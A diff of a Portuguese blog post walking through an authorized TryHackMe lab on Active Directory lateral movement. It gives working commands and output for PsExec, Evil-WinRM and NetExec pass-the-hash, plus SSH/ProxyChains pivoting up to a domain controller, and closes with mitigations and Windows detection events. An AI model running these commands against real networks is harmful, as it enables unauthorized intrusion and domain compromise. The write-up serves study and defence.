@@ -1,238 +1,663 @@
 ---
 layout: post
 title: "AD Lateral Movement - PsExec, WinRM, Pass-the-Hash e Pivoting"
-description: "Walkthrough de laboratório TryHackMe: enumeração, administração remota Windows, reutilização de credenciais e túneis SSH, com conceitos e detecção."
+description: "Walkthrough TryHackMe completo: da WRK ao Domain Controller usando PsExec, Evil-WinRM, NT hashes, túnel SSH e ProxyChains, com explicações, comparação de ferramentas e detecção."
 date: 2026-10-21
 categories: [walkthrough, pentest, windows, tryhackme]
-tags: [active-directory, lateral-movement, psexec, impacket, netexec, smb, winrm, pass-the-hash, ntlm, ssh, pivoting, proxychains, windows-laps, detection]
+tags: [active-directory, lateral-movement, psexec, impacket, netexec, smb, winrm, evil-winrm, pass-the-hash, ntlm, ssh, pivoting, proxychains, socks, windows-laps, detection]
 ---
+
+<a id="topo"></a>
 
 # AD Lateral Movement — PsExec, WinRM, Pass-the-Hash e Pivoting
 
-Neste exercício autorizado do **TryHackMe**, estudei como credenciais encontradas em um host podem abrir caminho para outros computadores do Active Directory. O objetivo é entender **qual máquina estou acessando, quais permissões tenho e por que o próximo salto funciona**.
+Em uma rede Active Directory, comprometer uma máquina costuma ser apenas o início. **Movimentação lateral** é passar de um host a outro utilizando credenciais e recursos de administração remota. Nesta room do **TryHackMe**, comecei com acesso SSH a um Linux e avancei até o **Domain Controller (DC)**, combinando privilégios locais, hashes NTLM e um túnel de rede.
 
-**Antes deste guia:** [Active Directory — enumeração e autenticação](/notes/ad-authenticated-enumeration/).
+O mais importante foi perceber que cada avanço dependia de **duas condições diferentes: permissão no destino e conectividade até ele**.
 
-## 1. Mapa do laboratório
+> Laboratório autorizado. Senhas e hashes indicados como placeholders devem ser substituídos pelos valores obtidos no próprio exercício.
 
-| Host | IP | Função |
+## Índice
+
+- [1. Ambiente e caminho percorrido](#ambiente)
+- [2. Reconhecimento da rede](#recon)
+- [3. Primeiro acesso: SSH no WebServer](#ssh)
+- [4. PsExec: SYSTEM na WRK](#psexec)
+- [5. WinRM: acesso limitado ao SERVER1](#winrm)
+- [6. Pass-the-Hash: administrador no SERVER1](#pth)
+- [7. Pivoting com SSH local (-L): testar RDP do DC](#localforward)
+- [8. Pivoting com SOCKS (-D) e ProxyChains](#socks)
+- [9. Acessar o DC e obter a última flag](#dc)
+- [10. Ferramentas: vantagens e limitações](#ferramentas)
+- [11. Mitigações e detecção no Windows](#defesa)
+- [12. Checklist e referência de comandos](#checklist)
+- [13. Referências e posts relacionados](#links)
+
+---
+
+<a id="ambiente"></a>
+
+## 1. Ambiente e caminho percorrido
+
+| Máquina | IP | Papel no exercício |
 |---|---|---|
-| WebServer | `192.168.13.71` | Linux comprometido; SSH e Gitea; intermediário de rede |
-| WRK / WRK1 | `192.168.13.61` | Estação Windows; jdoe possui administração local |
-| SERVER1 | `192.168.13.51` | Servidor Windows; jdoe pode usar WinRM, mas não tem administração local |
-| ROOTDC | `192.168.13.100` | Domain Controller do domínio `thm.loc` |
-
-Fluxo estudado:
+| **WebServer** | `192.168.13.71` | Linux comprometido, acesso SSH e servidor Gitea; servirá como pivô |
+| **WRK / WRK1** | `192.168.13.61` | Estação Windows na qual `jdoe` é administrador local |
+| **SERVER1** | `192.168.13.51` | Servidor Windows; `jdoe` tem acesso WinRM, mas não é administrador |
+| **ROOTDC / RDC1** | `192.168.13.100` | Controlador do domínio `thm.loc` |
 
 ~~~text
-AttackBox --SSH--> WebServer
-                   |--> WRK: acesso administrativo por PsExec -> SYSTEM
-                   |--> SERVER1: WinRM limitado -> acesso administrativo com credencial reutilizada
-                   +--> DC: caminho de rede via túnel SSH/ProxyChains
+AttackBox
+   |
+   +-- SSH (jdoe) --> WebServer
+   |
+   +-- PsExec (jdoe) --> WRK / SYSTEM
+   |                         |
+   |                         +--> NT hash do Administrator LOCAL
+   |
+   +-- WinRM (jdoe) --> SERVER1 / usuário comum
+   |                      |
+   +-- PtH (hash local) -> SERVER1 / Administrator
+   |                            |
+   |                            +--> NT hash do Domain Admin
+   |
+   +-- SSH via WebServer --> DC / SYSTEM
+                            flag5.txt
 ~~~
 
-**Cuidado com o /etc/hosts:** minhas primeiras anotações diziam `192.168.12.100` e `192.168.12.71`, mas o diagrama e os testes desta instância usam **192.168.13.x**. É preciso conferir as entradas e evitar linhas conflitantes.
+A room fornece credenciais para `jdoe`. Primeiro, usei a senha para entrar na WRK, onde esse usuário tem direitos de administrador local. A partir dali, encontrei um **NT hash de administrador local**. A reutilização dessa credencial abriu o SERVER1, que continha outra credencial, desta vez de **administrador do domínio**.
+
+**Atenção aos IPs:** nas primeiras anotações de `/etc/hosts` aparecia `192.168.12.x`; os testes e o diagrama desta instância usam **192.168.13.x**. Ajustei os nomes conforme a rede efetiva:
 
 ~~~bash
+sudo sh -c "printf '192.168.13.100 thm.loc ROOTDC.THM.LOC\n192.168.13.71 git.thm.loc\n' >> /etc/hosts"
 getent hosts thm.loc git.thm.loc
-cat /etc/hosts
 ~~~
 
-## 2. Enumerar os hosts e serviços
+O `>>` **acrescenta** linhas; não apaga as anteriores. Se já houver entradas antigas para esses nomes, remova-as para não haver resolução conflitante.
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="recon"></a>
+
+## 2. Reconhecimento da rede
+
+Antes de tentar acesso remoto, conferi quais hosts respondiam:
 
 ~~~bash
 fping -agq 192.168.13.0/24 2>/dev/null > hosts.txt
 cat hosts.txt
+~~~
+
+Resultado:
+
+~~~text
+192.168.13.1
+192.168.13.51
+192.168.13.61
+192.168.13.71
+192.168.13.100
+192.168.13.250
+~~~
+
+Depois, examinei os serviços Windows mais relevantes:
+
+~~~bash
 nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
 ~~~
 
-| Parâmetro | Explicação |
+| Parâmetro | Para que serve |
 |---|---|
-| `-a -g -q` no fping | Mostra ativos, percorre a faixa e reduz mensagens |
+| `-a -g -q` (fping) | Retorna hosts que responderam, gerando alvos da faixa e reduzindo mensagens |
 | `2>/dev/null` | Descarta erros |
-| `> hosts.txt` | Salva a saída, sobrescrevendo arquivo anterior |
-| `-p` | Define portas |
-| `-sV` | Identifica serviços |
-| `-sC` | Usa scripts Nmap padrão |
-| `-iL` | Lê os alvos do arquivo |
+| `> hosts.txt` | Salva a saída, sobrescrevendo o arquivo |
+| `-p` | Define as portas do Nmap |
+| `-sV` / `-sC` | Identifica serviços / executa scripts padrão |
+| `-iL` | Lê os IPs do arquivo |
 
-**Resultado que observei:** a porta SMB **445 estava aberta** na WRK e no SERVER1. No DC, as portas testadas apareciam como `filtered` a partir da AttackBox. Isso não prova que os serviços estejam fechados: pode haver filtragem de rede. Dois outros IPs responderam, `.1` e `.250`; o `.250` mostrava Samba/WORKGROUP, sem identificação como membro do AD da room.
+**O que encontrei:** SMB (`445`) aberto na WRK e no SERVER1; no DC, os serviços testados apareciam como `filtered` **a partir da AttackBox**. A máquina `.250` apresentou Samba/WORKGROUP e não foi tratada como membro do domínio.
 
-## 3. SSH e identidade
+> `open` significa que houve resposta de serviço; `closed` indica rejeição da conexão; `filtered` significa que a filtragem impediu concluir se estava aberta ou fechada. Um `filtered` no DC não prova que a senha ou o hash estejam errados.
 
-A entrada inicial foi uma sessão SSH no WebServer, usando a credencial de laboratório fornecida pela room.
+[Voltar ao índice](#topo)
+
+---
+
+<a id="ssh"></a>
+
+## 3. Primeiro acesso: SSH no WebServer
 
 ~~~bash
 ssh jdoe@192.168.13.71
+~~~
+
+Já no Linux:
+
+~~~bash
 whoami
 id
 ~~~
 
-O resultado foi `jdoe`, UID 1001, no Linux. **Permissões Linux não se transferem automaticamente para Windows.** Uma conta pode ter direitos diferentes em cada host.
+Recebi `jdoe` (UID 1001). Essa conta não tinha privilégios adicionais relevantes no Linux, mas era **administradora local na WRK**. Os direitos de uma conta devem ser analisados **em cada host**.
 
-## 4. PsExec: por que uma conta administrativa abre shell SYSTEM?
+[Voltar ao índice](#topo)
 
-O PsExec do **Impacket** usa **SMB (445)** para autenticar, um compartilhamento administrativo (como `ADMIN$`) para enviar o binário temporário e o **Service Control Manager** para instalar/iniciar um serviço remoto.
+---
 
-No exercício, o NetExec validou as permissões de `jdoe` na WRK:
+<a id="psexec"></a>
+
+## 4. PsExec — SYSTEM na WRK
+
+**PsExec** é uma técnica de administração remota. A implementação do **Impacket** usa SMB `445`, faz upload de um executável no compartilhamento administrativo `ADMIN$` e cria um serviço Windows pelo **Service Control Manager (SCM)**.
+
+Primeiro, usei o **NetExec** para conferir se a credencial de `jdoe` realmente tinha administração local:
 
 ~~~bash
-nxc smb 192.168.13.61 -u jdoe -p '<SENHA_DA_ROOM>' -d thm.loc
+nxc smb 192.168.13.61 -u jdoe -p '<SENHA_JDOE>' -d thm.loc
 ~~~
 
-- `-u`: usuário; `-p`: senha; `-d`: domínio.
-- `[+]`: autenticação aceita; `(Pwn3d!)`: o NetExec detectou acesso administrativo compatível com suas verificações.
+A saída retornou `(Pwn3d!)`. Isso indica que o NetExec reconheceu privilégios administrativos no alvo. Então iniciei a shell:
 
-A execução posterior do PsExec mostrou `Found writable share ADMIN$`, upload de executável, criação e início de serviço. Na shell Windows:
+~~~bash
+psexec.py thm.loc/jdoe:'<SENHA_JDOE>'@192.168.13.61
+~~~
+
+Pontos que apareceram na saída:
+
+~~~text
+[*] Found writable share ADMIN$
+[*] Uploading file jvGiIWdo.exe
+[*] Opening SVCManager ...
+[*] Creating service dLBO ...
+[*] Starting service dLBO ...
+C:\Windows\system32>
+~~~
+
+Na **WRK**, confirmei:
 
 ~~~cmd
 whoami
 whoami /priv
 ~~~
 
-Resultado que confirmei: **`nt authority\system`**. A razão não é que `jdoe` tenha se tornado SYSTEM: ele possuía autorização para **criar um serviço**, e o serviço rodou como **LocalSystem**.
-
-**Flag registrada:** `THM{ps3x3c_syst3m_sh3ll}`.
-
-## 5. Encontrar e interpretar credenciais
-
-Na WRK, foi examinado o arquivo `C:\Users\Administrator\Documents\loot.txt`, com a estrutura:
-
 ~~~text
-Administrator:500:LM_HASH:NT_HASH:::
+nt authority\system
 ~~~
 
-| Campo | Significado |
+**Por que virei SYSTEM?** Não foi o `jdoe` que mudou de identidade. Ele tinha direitos para instalar o serviço remoto, e o serviço foi iniciado como **LocalSystem**. Isso explica também o rastro de detecção: uma instalação de serviço gera o **Event ID 7045 no log System**.
+
+Flag obtida nesta etapa: `THM{ps3x3c_syst3m_sh3ll}`.
+
+### Credencial encontrada na WRK
+
+Com acesso SYSTEM, li:
+
+~~~cmd
+type C:\Users\Administrator\Documents\loot.txt
+~~~
+
+A linha tinha o formato típico do `secretsdump`:
+
+~~~text
+Administrator:500:LM_HASH:NT_HASH_LOCAL:::
+~~~
+
+| Campo | Interpretação |
 |---|---|
-| `Administrator` | Conta de administrador **local** |
-| `500` | RID da conta Administrator integrada |
-| `LM_HASH` | Campo reservado ao formato de hash LM |
-| `NT_HASH` | Representação NTLM usada na autenticação NTLM |
+| `Administrator` | Conta local integrada |
+| `500` | RID padrão dessa conta |
+| `LM_HASH` | Campo LM, frequentemente com o marcador de hash vazio |
+| `NT_HASH_LOCAL` | NT hash que será testado na próxima máquina |
 
-**Lição:** anotar sempre o **escopo da conta**. `Administrator` local de uma máquina não é a mesma identidade que `THM\Administrator` do domínio. Não publique hashes ou senhas reais de produção em relatórios abertos.
+**Dica que fica:** uma conta `WRK1\Administrator` é **local**. Não é a mesma coisa que `THM\Administrator`, administrador **do domínio**.
 
-## 6. WinRM: shell remota não é sinônimo de administrador
+[Voltar ao índice](#topo)
 
-A conta `jdoe` fazia parte de **Remote Management Users** no SERVER1. O acesso estudado foi por **Evil-WinRM**, no protocolo de gerenciamento remoto do Windows, normalmente nas portas TCP 5985 ou 5986.
+---
 
-A existência de uma sessão WinRM confirma **permissão de login remoto**, não permissão para instalar serviços ou acessar diretórios de administrador.
+<a id="winrm"></a>
 
-**Flag registrada:** `THM{w1nrm_r3m0t3_sh3ll}`.
+## 5. WinRM — entrar no SERVER1 sem ser administrador
 
-## 7. Pass-the-Hash e reutilização de credenciais
+Diferente de PsExec, o **WinRM (Windows Remote Management)** pode permitir uma shell remota a integrantes de **Remote Management Users**, mesmo que não sejam administradores locais. O serviço costuma usar `5985/TCP` (HTTP) ou `5986/TCP` (HTTPS).
 
-**Pass-the-Hash (PtH)** autentica por NTLM usando o NT hash, sem recuperar a senha original em texto claro. Não é a mesma coisa que quebrar um hash offline.
+Com `jdoe`:
 
-Na room, o hash de um administrador **local** encontrado na WRK foi aproveitado contra o SERVER1, onde a conta tinha uma credencial equivalente. Assim, foi possível executar comandos com privilégios mais altos naquele servidor.
+~~~bash
+evil-winrm -i 192.168.13.51 -u jdoe -p '<SENHA_JDOE>'
+~~~
 
-### Parâmetros vistos na prática
+Dentro da sessão:
 
-| Sintaxe | Significado |
-|---|---|
-| `nxc smb` | Verificação de acesso SMB |
-| `-H` | Fornece NT hash em vez de senha |
-| `--local-auth` | Autentica contra contas locais do host |
-| `psexec.py -hashes LM:NT` | Aceita os campos LM e NT na autenticação |
-| `DOMINIO/usuario@host` | Identifica a conta de domínio e o alvo |
+~~~powershell
+whoami
+hostname
+~~~
 
-No SERVER1, foi possível ler `C:\Users\Administrator\Desktop\flag4.txt`. **Flag registrada:** `THM{p4ss_th3_h4sh_ftw}`.
+~~~text
+thm\jdoe
+SERVER1
+~~~
 
-Também foi encontrado `da_creds.txt`, cujo conteúdo apontava uma credencial da conta `THM\Administrator` (domínio), **diferente** do administrador local utilizado antes. O laboratório evidencia por que não se deve reutilizar senhas administrativas entre máquinas ou expor credenciais de domínio em servidores comuns.
+Essa shell roda **como o usuário autenticado**, não como SYSTEM. Na room, `jdoe` não podia acessar os arquivos do perfil de Administrator.
 
-## 8. Pivoting: quando há credencial, mas não há caminho de rede
+Flag desta fase: `THM{w1nrm_r3m0t3_sh3ll}`.
 
-A conexão SMB direta da AttackBox ao DC expirava, assim como a tentativa HTTP direta ao Gitea interno. O **WebServer** aceitava SSH e podia funcionar como intermediário (*pivot*).
+[Voltar ao índice](#topo)
 
-**Local port forwarding** (`ssh -L`): associa **uma porta local** a um serviço remoto específico. No exemplo da room, a porta local 13389 representava o serviço RDP 3389 do DC, através do WebServer.
+---
 
-**Dynamic port forwarding** (`ssh -D`): cria um proxy SOCKS local (ex.: porta 1080). Com o **ProxyChains**, ferramentas TCP podem usar o túnel para alcançar serviços internos. Ao contrário de `-L`, não é necessário definir previamente cada destino.
+<a id="pth"></a>
 
-| Opção | Papel |
-|---|---|
-| `ssh -L` | Encaminhamento local de porta |
-| `ssh -D` | Proxy SOCKS dinâmico |
-| `ssh -N` | Mantém o túnel sem executar comando remoto |
-| `ssh -f` | Passa o SSH ao segundo plano |
-| `proxychains` | Encaminha conexões TCP compatíveis via proxy |
-| `proxy_dns` | Tenta fazer resolução DNS através do proxy |
+## 6. Pass-the-Hash — administrador no SERVER1
 
-**Nmap via SOCKS:** use **`-sT`** (TCP Connect) com **`-Pn`** (sem depender de descoberta por ping). `-sS` precisa enviar pacotes SYN brutos, que não passam pelo SOCKS do ProxyChains tradicional. Também não conte com ping ICMP nem UDP por esse método.
+Aqui entra a credencial encontrada na WRK. **Pass-the-Hash (PtH)** usa o **NT hash diretamente no desafio/resposta NTLM**, sem precisar recuperar a senha original.
 
-**Estado do exercício:** minha última anotação incluiu a tentativa de conexão ao DC através de ProxyChains, mas **não** a saída confirmando a autenticação nem uma leitura real de `flag5.txt`. Portanto, não publico a flag ilustrativa do enunciado como resultado obtido.
+É importante distinguir:
 
-### Outras ferramentas citadas pela room
-
-- **Chisel**: túneis TCP sobre HTTP, úteis quando SSH não está disponível.
-- **Ligolo-ng**: túnel com interface TUN, que permite usar ferramentas sem envolvê-las individualmente com ProxyChains.
-
-São alternativas de estudo, não ferramentas que eu tenha confirmado ter executado nesta room.
-
-## 9. Mitigação e detecção
-
-| Controle | O que evita/reduz |
-|---|---|
-| **Windows LAPS** | Senhas locais exclusivas e rotativas; dificulta reutilização do NT hash entre hosts |
-| Princípio do menor privilégio | Evita administrar outras máquinas com contas comuns |
-| Restrições a NTLM | Reduz oportunidades de PtH; deve-se auditar compatibilidade |
-| Firewall/segmentação | Restringe SMB, WinRM e RDP entre máquinas sem necessidade |
-| PAW | Isola operações e credenciais de administração de domínio |
-| Credential Guard | Protege segredos do LSASS em cenários suportados |
-| SMB signing | Protege integridade SMB e combate relay; **não bloqueia, sozinho, PtH válido** |
-
-**Eventos Windows de interesse:**
-
-| ID | Log | Significado |
+| Material | Origem típica | Funciona diretamente com PtH? |
 |---|---|---|
-| `4624` Type 3 | Security | Logon de rede |
-| `4624` Type 10 | Security | Logon remoto interativo (RDP) |
-| `4648` | Security | Credenciais explícitas |
-| **`7045`** | **System** | Novo serviço instalado; importante ao investigar PsExec |
-| `4688` | Security | Criação de processo, conforme auditoria habilitada |
-| `4698` | Security | Criação de tarefa agendada |
-| Sysmon `1` | Sysmon/Operational | Criação de processo |
-| Sysmon `10` | Sysmon/Operational | Acesso a outro processo, inclusive LSASS |
+| **NT hash (32 caracteres hexadecimais)** | SAM, NTDS.dit, LSASS ou arquivo extraído | **Sim**, quando o serviço aceita NTLM e a conta tem acesso |
+| **Net-NTLMv2 (challenge/response)** | Autenticação capturada na rede | **Não**; é outro formato |
 
-Comando de consulta no PowerShell:
+Na room, o mesmo hash de **Administrator local** servia na WRK e no SERVER1 — exemplo clássico de **senha administrativa reutilizada**.
+
+### Confirmar onde o hash funciona
+
+~~~bash
+nxc smb 192.168.13.61 192.168.13.51 \
+  -u Administrator -H '<NT_HASH_LOCAL>' --local-auth
+~~~
+
+- `-H`: fornece o NT hash; `--local-auth`: tenta autenticar usando as **contas locais** de cada máquina.
+- `[+]`: autenticação aceita; `(Pwn3d!)`: acesso administrativo reconhecido.
+
+### Acesso confirmado com Evil-WinRM
+
+Na prática, utilizei o próprio Evil-WinRM com hash:
+
+~~~bash
+evil-winrm -i 192.168.13.51 -u Administrator -H '<NT_HASH_LOCAL>'
+~~~
+
+O terminal respondeu:
+
+~~~text
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+server1\administrator
+~~~
+
+Agora a diferença fica evidente: antes eu era `thm\jdoe`; agora sou **`server1\administrator`**, uma **conta local administrativa**. O comando `whoami` não retorna SYSTEM porque o WinRM não troca automaticamente a identidade por LocalSystem.
+
+No SERVER1:
+
+~~~powershell
+type C:\Users\Administrator\Desktop\flag4.txt
+~~~
+
+~~~text
+THM{p4ss_th3_h4sh_ftw}
+~~~
+
+Também li:
+
+~~~powershell
+type C:\Users\Administrator\Documents\da_creds.txt
+~~~
+
+~~~text
+THM\Administrator:500:LM_HASH:NT_HASH_DA:::
+~~~
+
+Essa segunda credencial representa o **Administrator do domínio THM**, e seu NT hash é **diferente** do Administrator local. É essa distinção que possibilita entender o avanço até o DC.
+
+> **Comparação rápida:** PsExec com administração local abre uma shell SYSTEM porque cria um serviço; Evil-WinRM com o mesmo hash abre uma sessão com a identidade da conta Administrator. Não confunda **ser administrador** com **estar executando como SYSTEM**.
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="localforward"></a>
+
+## 7. Pivoting com SSH `-L` — testar o RDP do DC
+
+Eu já tinha a credencial do domínio, mas havia outro obstáculo: **a AttackBox não alcançava diretamente o DC pela porta SMB 445**, nem o Gitea do WebServer pela porta HTTP 80. O SSH `22` do WebServer estava acessível.
+
+**Pivoting** é fazer o tráfego passar por um host intermediário que consegue alcançar o serviço interno.
+
+### 7.1 Caminho do primeiro túnel
+
+![Caminho SSH local: AttackBox 127.0.0.1:13389, WebServer SSH 22, DC 192.168.13.100 RDP 3389](/assets/images/ad-ssh-local-port-forward.svg)
+
+O objetivo desta primeira prova é **verificar que o RDP do DC responde pelo túnel**, não obter a senha do Administrator.
+
+No **terminal 1 da AttackBox**:
+
+~~~bash
+ssh -v -o ExitOnForwardFailure=yes \
+  -L 13389:192.168.13.100:3389 \
+  jdoe@192.168.13.71 -N
+~~~
+
+| Opção | Explicação |
+|---|---|
+| `-v` | Mostra mensagens de depuração do SSH |
+| `-o ExitOnForwardFailure=yes` | Encerra se não conseguir estabelecer o encaminhamento pedido, como abrir a porta local |
+| `-L 13389:DC:3389` | Escuta em `127.0.0.1:13389` na AttackBox e encaminha ao RDP `3389` do DC pelo WebServer |
+| `-N` | Não abre shell remota; mantém apenas o túnel |
+
+**O terminal ficar parado é normal**, pois o SSH precisa continuar ativo. A opção `ExitOnForwardFailure` não prova sozinha que o serviço remoto funciona.
+
+No **terminal 2**, testei o acesso RDP pela porta local:
+
+~~~bash
+xfreerdp /v:127.0.0.1:13389 \
+  /u:Administrator /p:'NotTheCorrectPassword' /cert:ignore
+~~~
+
+A senha está **deliberadamente incorreta**. A resposta foi:
+
+~~~text
+STATUS_LOGON_FAILURE [0xC000006D]
+ERRCONNECT_LOGON_FAILURE
+~~~
+
+O teste **não autentica**, mas mostra que o serviço RDP respondeu e rejeitou a credencial. No terminal do SSH também apareceram mensagens `direct-tcpip` / `listening port 13389`, indicando o encaminhamento da conexão.
+
+**Aprendizado:** um **erro de login** não é um **erro de conectividade**. Neste caso, era justamente a prova de que o túnel até o RDP funcionava.
+
+### 7.2 `-L` ou `-D`?
+
+| Técnica | O que encaminha | Quando usar |
+|---|---|---|
+| **SSH `-L`** | Uma porta local para um serviço definido | Testar RDP, HTTP ou outra porta específica |
+| **SSH `-D`** | Múltiplas conexões TCP via proxy SOCKS | Acessar vários hosts/serviços usando ProxyChains |
+
+Para o restante da room, usei **`-D`**.
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="socks"></a>
+
+## 8. Pivoting com SOCKS e ProxyChains
+
+### 8.1 Criar o proxy SOCKS via WebServer
+
+Na AttackBox:
+
+~~~bash
+ssh -f -D 1080 jdoe@192.168.13.71 -N
+~~~
+
+- `-D 1080`: inicia um **proxy SOCKS local** em `127.0.0.1:1080`.
+- `-f`: envia o processo SSH para segundo plano após autenticar.
+- `-N`: não executa comando no host remoto.
+
+**SOCKS** não é um serviço do DC; é um intermediário local que aceita conexões de ferramentas e as encaminha pelo SSH.
+
+### 8.2 O que é ProxyChains?
+
+**ProxyChains** é um programa Linux que intercepta conexões TCP compatíveis e as faz passar por um ou mais proxies. Assim, posso executar `proxychains nxc`, `proxychains curl` ou `proxychains psexec.py` sem que cada ferramenta precise configurar SOCKS individualmente.
+
+A configuração utilizada pela room fica em `/etc/proxychains.conf`, na seção `[ProxyList]`:
+
+~~~ini
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+#socks4 127.0.0.1 9050
+socks4 127.0.0.1 1080
+~~~
+
+**Por que aparece "defaults set to tor"?** É **apenas um comentário** no arquivo de exemplo. Muitos sistemas trazem como padrão o proxy SOCKS do **Tor** em `127.0.0.1:9050`. A linha começa com `#`, portanto está **desativada**. Neste laboratório **não usei Tor**: o proxy ativo é o SSH criado em `1080`.
+
+| Elemento | Significado |
+|---|---|
+| `[ProxyList]` | Lista de proxies usados |
+| `#` | Comenta uma linha; ela não é executada |
+| `socks4` | Tipo de proxy, compatível com o SSH dinâmico |
+| `127.0.0.1` | Proxy está na própria AttackBox |
+| `1080` | Porta onde `ssh -D` está escutando |
+| `strict_chain` | Quando habilitado, tenta usar os proxies ativos em sequência |
+| `proxy_dns` | Quando habilitado e suportado, encaminha resolução de nomes pelo proxy |
+
+### 8.3 Confirmar o túnel: Gitea pelo ProxyChains
+
+Antes, o `curl` direto ao HTTP do WebServer expirava. Com o proxy:
+
+~~~bash
+proxychains curl -s http://192.168.13.71 | head -20
+~~~
+
+A saída mostrou:
+
+~~~text
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.13.71:80-<><>-OK
+<!DOCTYPE html>
+<html lang="en-US" data-theme="gitea-auto">
+<title>Gitea: Git with a cup of tea</title>
+~~~
+
+- `S-chain`: uso da cadeia configurada no ProxyChains.
+- `127.0.0.1:1080`: proxy SOCKS local.
+- `192.168.13.71:80`: destino HTTP atingido.
+- `-OK`: conexão TCP estabelecida.
+- `| head -20`: mostra apenas as primeiras 20 linhas do HTML.
+
+**Esse resultado confirma o pivoting:** o Gitea, que não respondia diretamente à AttackBox, passou a responder pelo túnel.
+
+Também é possível abrir o **Firefox** com proxy manual `SOCKS v4` em `127.0.0.1:1080` e navegar para `http://192.168.13.71`.
+
+### 8.4 Nmap através de ProxyChains
+
+~~~bash
+proxychains nmap -sT -Pn -p 445,3389,5985 192.168.13.100
+~~~
+
+- **`-sT` (TCP Connect)**, no lugar de `-sS`: a conexão precisa passar pelo proxy, não enviar pacotes SYN brutos.
+- **`-Pn`**: não depende do ping inicial, que costuma falhar via SOCKS.
+- ProxyChains tradicional **não** encaminha ping ICMP nem `nmap -sU` (UDP).
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="dc"></a>
+
+## 9. Último salto — Domain Controller
+
+Com o proxy funcionando e o **NT hash do Domain Admin** encontrado no SERVER1, consegui atingir o DC via **SMB 445**. Para verificar a credencial:
+
+~~~bash
+proxychains nxc smb 192.168.13.100 \
+  -u Administrator -H '<NT_HASH_DA>' -d thm.loc
+~~~
+
+O acesso final foi feito pelo PsExec **através do mesmo túnel**:
+
+~~~bash
+proxychains psexec.py -hashes :<NT_HASH_DA> \
+  thm.loc/Administrator@192.168.13.100
+~~~
+
+O `:` antes do NT hash indica o **campo LM vazio** no argumento `-hashes LM:NT`; `thm.loc/Administrator` deixa explícito que é a conta do **domínio**, e não a conta local do servidor anterior.
+
+A saída comprovou a conexão:
+
+~~~text
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.13.100:445-<><>-OK
+[*] Found writable share ADMIN$
+[*] Uploading file AhiJsjRK.exe
+[*] Creating service WOQe ...
+[*] Starting service WOQe ...
+C:\Windows\system32>
+~~~
+
+Já dentro do DC:
+
+~~~cmd
+whoami
+hostname
+type C:\Users\Administrator\Desktop\flag5.txt
+~~~
+
+Resultado:
+
+~~~text
+nt authority\system
+RDC1
+THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}
+~~~
+
+**Room concluída.** A sequência mostrou dois tipos de obstáculo: primeiro precisei de **privilégios/credenciais**; depois, de um **caminho de rede**. O SSH/ProxyChains resolveu o segundo problema, e o hash do domínio resolveu o primeiro.
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="ferramentas"></a>
+
+## 10. Ferramentas: vantagens, limitações e quando usar
+
+### Execução remota Windows
+
+| Ferramenta | Vantagem | Limitação / detecção | Quando considerar |
+|---|---|---|---|
+| **PsExec (Impacket)** | Shell SYSTEM via serviço | Exige admin/SMB; escreve binário e gera `7045` | Administração remota via SMB |
+| **Evil-WinRM** | PowerShell interativo; pode aceitar Remote Management Users | Precisa WinRM e direitos de sessão; roda como usuário autenticado | Gerenciamento PowerShell remoto |
+| **NetExec** | Verifica várias contas/hosts; sinaliza `(Pwn3d!)` | Múltiplas autenticações chamam atenção | Validar acesso antes de outros passos |
+| **wmiexec.py** | Executa comandos por WMI sem instalar serviço como PsExec | Exige permissões remotas e conectividade RPC/DCOM | Operações remotas com WMI |
+| **smbexec.py** | Não precisa enviar o mesmo executável de serviço do PsExec | Cria serviço, podendo gerar `7045` | Outro método de execução via SMB |
+| **atexec.py** | Usa Agendador de Tarefas | Criação de tarefas deixa evidências, como `4698` | Ambientes onde há permissão de tarefas |
+| **RDP** | Área de trabalho gráfica | Requer serviço e autorização de logon RDP; `4624` tipo 10 | Aplicações com interface gráfica |
+
+**Cuidado:** quantidade de eventos não torna uma ferramenta invisível. WMI e WinRM também podem gerar telemetria relevante.
+
+### Ferramentas de pivoting
+
+| Ferramenta | Prós | Contras | Uso típico |
+|---|---|---|---|
+| **SSH `-L`** | Simples e direto | Cada destino/porta precisa de configuração | Encaminhar um serviço |
+| **SSH `-D` + ProxyChains** | Um SOCKS para várias conexões TCP | Limitações de UDP/ICMP, DNS e certos programas | Laboratórios pequenos/médios |
+| **Chisel** | Túnel via HTTP; não depende de SSH | Requer cliente/servidor executáveis | Host pivô sem SSH |
+| **Ligolo-ng** | Interface TUN; ferramentas usam rotas de rede | Configuração inicial mais elaborada | Múltiplas redes e pivôs |
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="defesa"></a>
+
+## 11. Mitigações e detecção no Windows
+
+O fluxo da room permite associar cada problema a um controle defensivo.
+
+| Controle | Que parte da cadeia reduz |
+|---|---|
+| **Windows LAPS** | Mantém senhas locais únicas e rotativas: o hash do Administrator da WRK não serviria automaticamente no SERVER1 |
+| **Privilégio mínimo** | Evita conceder administração local a contas de uso comum e reduz execução remota via serviços |
+| **Restringir NTLM** | Dificulta Pass-the-Hash; é importante auditar dependências antes de negar |
+| **Firewall e segmentação** | Limita SMB 445, WinRM 5985 e RDP 3389 entre máquinas que não precisam se comunicar |
+| **PAW / administração por camadas** | Evita que contas de Domain Admin sejam utilizadas em estações e servidores comuns |
+| **Credential Guard** | Ajuda a proteger credenciais em memória no LSASS; **não impede a leitura de um arquivo `loot.txt` já exposto** |
+| **SMB signing** | Protege integridade SMB e dificulta **SMB relay**; **não bloqueia sozinho PsExec nem PtH com credencial válida** |
+
+**Windows LAPS** (Local Administrator Password Solution) é o recurso da Microsoft que gerencia senhas de administrador local exclusivas por computador. Está disponível em versões suportadas do Windows por atualizações adequadas, inclusive algumas anteriores ao Windows 11. É a resposta à pergunta sobre senhas locais únicas.
+
+### Eventos que eu procuraria no SOC
+
+| Event ID | Log | Indício a investigar |
+|---|---|---|
+| `4624`, Type 3 | Security | Login de rede por SMB/WinRM de origem incomum |
+| `4624`, Type 10 | Security | Login RDP |
+| `4648` | Security | Credenciais explícitas, se o mecanismo gerar esse evento |
+| **`7045`** | **System** | Serviço recém-instalado, como na execução por PsExec |
